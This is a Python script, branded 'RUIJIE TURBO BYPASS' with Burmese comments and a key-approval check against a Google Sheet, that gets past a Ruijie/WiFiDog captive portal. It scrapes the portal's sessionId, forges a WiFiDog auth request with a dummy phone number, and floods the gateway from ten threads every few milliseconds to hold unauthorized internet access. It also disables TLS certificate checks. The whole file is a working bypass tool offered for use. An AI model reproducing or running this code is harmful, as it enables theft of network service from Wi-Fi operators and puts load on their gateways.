import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
from urllib.parse import urlparse, parse_qs, urljoin

# SSL warnings တွေကို ပိတ်ထားခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# CONFIG (OPTIMIZED FOR SPEED & LOW PING)
# ===============================
PING_THREADS = 10        
MIN_INTERVAL = 0.001     
MAX_INTERVAL = 0.01      
DEBUG = False

# ===============================
# KEY SYSTEM CONFIG
# ===============================
SHEET_ID = "1MKfd87jf2GB9rE1QWTU0BCTno9l3my2ewdfpUEMM9hI"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")

# ===============================
# COLOR SYSTEM
# ===============================
RED = "\033[91m"; GREEN = "\033[92m"; CYAN = "\033[96m"
YELLOW = "\033[93m"; MAGENTA = "\033[95m"; RESET = "\033[0m"
B_GREEN = "\033[1;32m"; B_CYAN = "\033[1;36m"; B_RED = "\033[1;31m"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

def get_system_key():
    try: uid = os.geteuid()
    except: uid = 1000
    try: username = os.getlogin()
    except: username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not any(x in line.lower() for x in ['key', 'username']):
                    key = line.split(',')[0].strip().strip('"')
                    if key: keys.append(key)
            if keys:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f: f.write('\n'.join(keys))
                except: pass
            return keys
    except: pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
    except: pass
    return keys

def check_approval():
    os.system('clear')
    print(f"{B_CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                ULTRA SPEED BYPASS SYSTEM                         ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    print(f"\n{B_CYAN}[!] Checking approval status...{RESET}")
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    if system_key in authorized_keys:
        print(f"\n{B_GREEN}   [✓] KEY APPROVED! TURBO MODE ENABLED.{RESET}")
        time.sleep(1)
        return True
    else:
        print(f"\n{B_RED}   [❌] KEY NOT APPROVED{RESET}")
        print(f"   {YELLOW}Contact Admin: {RESET}@Kenobe21")
        print(f"   {YELLOW}Your Key: {RESET}{CYAN}{system_key}{RESET}")
        return False

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=2).status_code == 200
    except:
        return False

def banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║     RUIJIE TURBO BYPASS (PRO)        ║
║     Optimized for Low Latency        ║
╚══════════════════════════════════════╝
{RESET}""")

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    session.verify = False
    adapter = requests.adapters.HTTPAdapter(pool_connections=PING_THREADS, pool_maxsize=PING_THREADS)
    session.mount('http://', adapter)
    
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=3)
            sys.stdout.write(f"\r{B_GREEN}[✓] BYPASS STABLE | TURBO ACTIVE >>> [{random.randint(20,60)}ms]{RESET}")
            sys.stdout.flush()
        except:
            pass
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_process():
    banner()
    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    sys.stdout.write(f"\r{YELLOW}[•] Internet Active. Monitoring Quality...{RESET}")
                    sys.stdout.flush()
                    time.sleep(5)
                    continue

            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"

            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None

            if not sid:
                time.sleep(2)
                continue

            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

            print(f"\n{CYAN}[*] Session ID: {sid} | Starting Turbo Threads...{RESET}")

            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            while check_real_internet():
                time.sleep(5)

        except Exception:
            time.sleep(2)

if __name__ == "__main__":
    try:
        if check_approval():
            start_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}[!] Engine Shutdown.{RESET}")
